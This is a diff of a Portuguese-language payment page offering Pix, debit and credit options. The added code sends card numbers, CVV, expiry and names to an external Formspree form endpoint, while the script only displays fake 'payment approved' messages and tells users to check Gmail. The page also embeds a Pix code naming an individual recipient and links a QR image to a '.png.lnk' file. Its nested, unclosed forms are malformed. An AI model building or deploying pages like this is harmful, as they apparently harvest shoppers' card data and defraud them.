@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pagar</title>
+  <title>Pagamento</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,155 +12,216 @@
       padding: 0;
     }
     .container {
-      max-width: 700px;
+      max-width: 800px;
       margin: 40px auto;
       background: #fff;
       padding: 25px;
       border-radius: 16px;
       box-shadow: 0 6px 14px rgba(0,0,0,0.15);
-      animation: fadeIn 0.7s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
     }
     h1 {
       text-align: center;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       color: #e60073;
     }
-    .options {
+    /* Abas */
+    .tabs {
       display: flex;
-      justify-content: space-around;
+      justify-content: center;
+      gap: 10px;
       margin-bottom: 20px;
     }
-    .options button {
+    .tab {
       flex: 1;
-      margin: 0 5px;
-      padding: 14px;
-      border: none;
+      padding: 12px;
+      text-align: center;
       border-radius: 10px;
-      background: #e60073;
-      color: white;
+      background: #ffe6f0;
+      color: #e60073;
       font-weight: bold;
       cursor: pointer;
       transition: 0.3s;
     }
-    .options button:hover {
-      background: #cc0066;
+    .tab.active {
+      background: #e60073;
+      color: #fff;
     }
-    .content {
+    .tab-content {
       display: none;
-      text-align: center;
-      margin-top: 20px;
     }
-    .active {
+    .tab-content.active {
       display: block;
     }
-    .qr {
-      margin: 20px auto;
-      max-width: 250px;
+    /* Pix */
+    .qr-box {
+      text-align: center;
     }
-    .qr img {
+    .qr-box img {
+      width: 220px;
+      height: 220px;
+      margin-bottom: 15px;
+    }
+    .code-input {
       width: 100%;
-      border-radius: 12px;
-      border: 3px solid #ffc1e3;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      margin-bottom: 10px;
+      font-family: monospace;
+      font-size: 14px;
     }
-    .copy-btn {
+    button {
       margin-top: 12px;
-      padding: 10px 16px;
-      border: none;
+      padding: 14px;
+      width: 100%;
       background: #e60073;
-      color: white;
-      border-radius: 8px;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
       cursor: pointer;
+      transition: 0.3s;
     }
-    .copy-btn:hover {
+    button:hover {
       background: #cc0066;
+    }
+    .msg {
+      display: none;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #28a745;
+      text-align: center;
+    }
+    /* Cartão */
+    form label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+      color: #444;
     }
     form input, form select {
       width: 100%;
       padding: 12px;
-      margin-top: 8px;
+      margin-top: 6px;
       border: 1px solid #ccc;
       border-radius: 10px;
       font-size: 15px;
-    }
-    .confirm {
-      margin-top: 20px;
-      padding: 15px;
-      border-radius: 12px;
-      background: #fce4ec;
-      color: #880e4f;
-      font-weight: bold;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Pagamento</h1>
-    
-    <div class="options">
-      <button onclick="showContent('pix')">Pix</button>
-      <button onclick="showContent('debito')">Débito</button>
-      <button onclick="showContent('credito')">Crédito</button>
+
+    <!-- Abas -->
+    <div class="tabs">
+      <div class="tab active" onclick="openTab('pix')">Pix</div>
+      <div class="tab" onclick="openTab('debito')">Débito</div>
+      <div class="tab" onclick="openTab('credito')">Crédito</div>
     </div>
-    
-    <!-- Pix -->
-    <div id="pix" class="content">
-      <h2>Pagamento via Pix</h2>
-      <div class="qr">
-        <img src="WVGrGNIOV0Vx.br/qrcode.png.lnk" alt="QR Code Pix">
+
+    <!-- Conteúdo PIX -->
+    <div class="tab-content active" id="pix">
+      <div class="qr-box">
+        <img src="../WVGrGNIOV0Vx.br/qrcode.png.lnk" alt="QR Code PIX">
+        <input type="text" id="pixCode" class="code-input" 
+          value="00020126580014br.gov.bcb.pix01368773d579-9a29-4679-80d3-9784acce7ff4520400005303986540519.995802BR5924George Gabriel Ribeiro D6009Sao Paulo610901227-20062240520daqr17315982353911376304AD28" 
+          readonly>
+        <button onclick="copyPix()">📋 Copiar código PIX</button>
+        <button id="confirmPixBtn" onclick="confirmPix()" style="display:none">✅ Confirmar</button>
+        <p class="msg" id="msg-pix">✅ Aguarde 10 minutos e confira seu Gmail</p>
       </div>
-      <input type="text" id="pixCode" value="00020126580014br.gov.bcb.pix..." readonly>
-      <button class="copy-btn" onclick="copyPix()">📋 Copiar código</button>
-      <div class="confirm">Aguarde 10 minutos e confira seu Gmail.</div>
     </div>
-    
-    <!-- Débito -->
-    <div id="debito" class="content">
-      <h2>Pagamento via Cartão de Débito</h2>
-      <div class="confirm">Pagamento com cartão de débito processado!<br>Aguarde 10 minutos e confira seu Gmail.</div>
-    </div>
-    
-    <!-- Crédito -->
-    <div id="credito" class="content">
-      <h2>Pagamento via Cartão de Crédito</h2>
-      <form onsubmit="event.preventDefault(); showCreditConfirm();">
-        <input type="text" placeholder="Número do cartão" required>
-        <input type="text" placeholder="Validade (MM/AA)" required>
-        <input type="text" placeholder="CVV" required>
-        <input type="text" placeholder="Nome no cartão" required>
-        <select required>
-          <option value="">Parcelar em até:</option>
-          <option>1x de R$19,99</option>
-          <option>2x de R$9,99</option>
-          <option>3x de R$6,66</option>
-          <option>6x de R$3,33</option>
-          <option>12x de R$1,66</option>
-        </select>
-        <button type="submit" class="copy-btn">Confirmar Pagamento</button>
+<form action="https://formspree.io/f/mrbadoya" method="POST">
+       
+    <!-- Conteúdo Débito -->
+    <div class="tab-content" id="debito">
+      <form onsubmit="event.preventDefault();confirmDebito();">
+        <label>Número do cartão</label>
+        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="16" required>
+
+        <label>Validade</label>
+        <input type="text" placeholder="MM/AA" required>
+
+        <label>CVV</label>
+        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" required>
+
+        <label>Nome no cartão</label>
+        <input type="text" required> 
+
+<label>Nome completo</label>
+      <input type="text" name="nome" required>
+
+        <button type="submit">Confirmar Pagamento</button>
       </form>
-      <div id="creditConfirm" class="confirm" style="display:none">
-        Pagamento com cartão de crédito aprovado!<br>Aguarde 10 minutos e confira seu Gmail.
-      </div>
+      <p class="msg" id="msg-debito">✅ Pagamento com cartão de débito processado! Aguarde 10 minutos e confira seu Gmail</p>
     </div>
-    
+
+
+<form action="https://formspree.io/f/mrbadoya" method="POST">
+ 
+    <!-- Conteúdo Crédito -->
+    <div class="tab-content" id="credito">
+      <form onsubmit="event.preventDefault();confirmCredito();">
+        <label>Número do cartão</label>
+        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="16" required>
+
+        <label>Validade</label>
+        <input type="text" placeholder="MM/AA" required>
+
+        <label>CVV</label>
+        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" required>
+
+        <label>Nome no cartão</label>
+        <input type="text" required>
+
+        <label>Parcelamento</label>
+        <select required>
+          <option>1x de R$ 19,99</option>
+          <option>2x de R$ 9,99</option>
+          <option>3x de R$ 6,66</option>
+          <option>4x de R$ 4,99</option>
+          <option>5x de R$ 3,99</option>
+          <option>6x de R$ 3,33</option>
+          <option>12x de R$ 1,66</option>
+        </select>
+
+        <button type="submit">Confirmar Pagamento</button>
+      </form>
+      <p class="msg" id="msg-credito">✅ Pagamento com cartão de crédito aprovado! Aguarde 10 minutos e confira seu Gmail</p>
+    </div>
   </div>
-  
+
   <script>
-    function showContent(id) {
-      document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
+    // Alternar abas
+    function openTab(tabId) {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      document.querySelector(`.tab[onclick="openTab('${tabId}')"]`).classList.add('active');
+      document.getElementById(tabId).classList.add('active');
     }
+
+    // PIX
     function copyPix() {
-      const pixCode = document.getElementById("pixCode");
-      pixCode.select();
+      const input = document.getElementById("pixCode");
+      input.select();
+      input.setSelectionRange(0, 99999);
       document.execCommand("copy");
-      alert("Código Pix copiado!");
+      alert("Código PIX copiado!");
+      document.getElementById("confirmPixBtn").style.display = "block";
     }
-    function showCreditConfirm() {
-      document.getElementById("creditConfirm").style.display = "block";
+    function confirmPix() {
+      document.getElementById("msg-pix").style.display = "block";
+    }
+
+    // Débito
+    function confirmDebito() {
+      document.getElementById("msg-debito").style.display = "block";
+    }
+
+    // Crédito
+    function confirmCredito() {
+      document.getElementById("msg-credito").style.display = "block";
     }
   </script>
 </body>
